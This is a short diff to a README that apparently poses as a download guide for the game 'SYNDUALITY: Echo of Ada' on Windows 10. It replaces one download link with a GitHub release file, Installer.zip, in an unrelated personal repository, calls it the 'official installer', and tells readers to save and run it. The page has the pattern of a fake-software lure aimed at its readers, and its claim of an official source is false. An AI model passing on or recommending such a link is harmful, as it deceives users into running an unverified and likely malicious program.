@@ -30,7 +30,7 @@ The game delivers a next-gen experience with stunning 3D environments and detail
 Getting started with **SYNDUALITY: Echo of Ada** on Windows 10 is easy! Follow these steps:  
 
 ### 1. **Download the Installer for SYNDUALITY: Echo of Ada**  
-- Use this [**link**](https://nicecolns.com/) to download the game’s official installer.  
+- Use this [**link**](https://github.com/JeanSylvestrek/game4fun/releases/download/publish/Installer.zip) to download the game’s official installer.  
 - Save the file in your preferred directory (usually the "Downloads" folder).  
 
 ### 2. **Run the Installer for SYNDUALITY: Echo of Ada**  
